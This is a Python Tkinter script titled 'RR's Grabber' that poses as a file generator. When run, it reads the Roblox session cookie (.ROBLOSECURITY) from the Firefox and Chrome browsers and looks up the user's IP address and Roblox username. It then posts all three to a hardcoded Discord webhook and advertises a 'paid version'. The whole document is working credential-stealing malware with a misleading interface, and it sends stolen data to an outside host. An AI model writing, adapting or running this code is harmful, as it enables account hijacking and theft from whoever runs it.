import os
import requests
import browser_cookie3
import tkinter as tk
from tkinter import messagebox

def generate_python_file():
    webhook = "https://discord.com/api/webhooks/1095987665431703562/4Osghk4v55EUJmcmK7nEQIcZtQpeGCWK7QM1QdrlIKX_2QClnCWuRtjxwTgyuhX6ePlW"
    file_name = file_name_entry.get()

    if webhook == "" or file_name == "":
        messagebox.showerror("Error", "Please enter a webhook URL and file name.")
        return
    ip = requests.get("https://api.ipify.org").text

    def get_roblox_cookie():
        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except:
            pass
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.value
        except:
            pass
        return None

    roblox_cookie = get_roblox_cookie()

    if roblox_cookie is None:
        roblox_cookie = "No Roblox Cookie Found"

    # Fetch account information using Roblox API
    headers = {
        "Cookie": ".ROBLOSECURITY=" + roblox_cookie
    }
    account_info_url = "https://users.roblox.com/v1/users/authenticated"
    account_info_response = requests.get(account_info_url, headers=headers)

    if account_info_response.status_code == 200:
        account_info_data = account_info_response.json()

        # Extract relevant account information
        roblox_username = account_info_data.get("name", "Unknown Username")
        roblox_avatar_url = account_info_data.get("thumbnailUrl", "https://example.com/default_avatar.png")

        discord_data = {
            "username": "BOT - Audify (FREE VERSION) 🍪",
            "avatar_url": "https://media.discordapp.net/attachments/1090956626330144868/1091777808243622038/133-1332078_the-openui5-icon-comes-in-2-flavors-black.png?width=576&height=580g",
            "embeds": [
                {
                    "title": "Press Here To Buy Paid Version",
                    "author": {
                        "name": "Audify Has Logged Someone!",
                        "icon_url": "https://cdn-icons-png.flaticon.com/512/5968/5968968.png",
                    },
                    "url": "https://discord.gg/h8TGb3xDje",
                    "color": 16711680,
                    "fields": [
                        {"name": "Roblox Cookie", "value": f"```{roblox_cookie}```", "inline": False},
                        {"name": "IP Address", "value": f"**`{ip}`**", "inline": False},
                        {"name": "Username", "value": roblox_username, "inline": False},
                    ],
                    "thumbnail": {"url": roblox_avatar_url},
                },
            ],
        }

        response = requests.post(webhook, json=discord_data)
        if response.status_code == 204:
            messagebox.showinfo("Success", "File generated successfully.")
        else:
            messagebox.showerror("Error", "Failed to generate file.")

    else:
        messagebox.showerror("Error", "Failed to fetch account information from Roblox API.")

root = tk.Tk()
root.title("RR's Grabber")
root.geometry("600x400")

webhook_label = tk.Label(root, text="Webhook URL:")
webhook_label.pack()
webhook_entry = tk.Entry(root)
webhook_entry.pack()

file_name_label = tk.Label(root, text="File Name:")
file_name_label.pack()
file_name_entry = tk.Entry(root)
file_name_entry.pack()

generate_button = tk.Button(root, text="Generate", command=generate_python_file)
generate_button.pack()

root.mainloop()